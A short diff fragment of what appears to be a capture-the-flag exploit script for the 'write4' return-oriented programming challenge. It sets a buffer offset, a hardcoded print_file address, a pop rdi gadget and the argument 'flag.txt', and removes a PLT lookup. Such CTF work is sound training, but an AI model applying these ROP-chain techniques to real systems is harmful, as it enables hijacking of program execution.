@@ -13,9 +13,6 @@ else:
 
 offset = 40 #pattern search $rsp
 
-printfile = exe.plt['print_file']
-
-
 call_printfile = 0x0000000000400620 
 pop_rdi = 0x0000000000400693 #ROPgadget --binary ./write4 | grep -E "pop rdi" 
 arg = b'flag.txt'
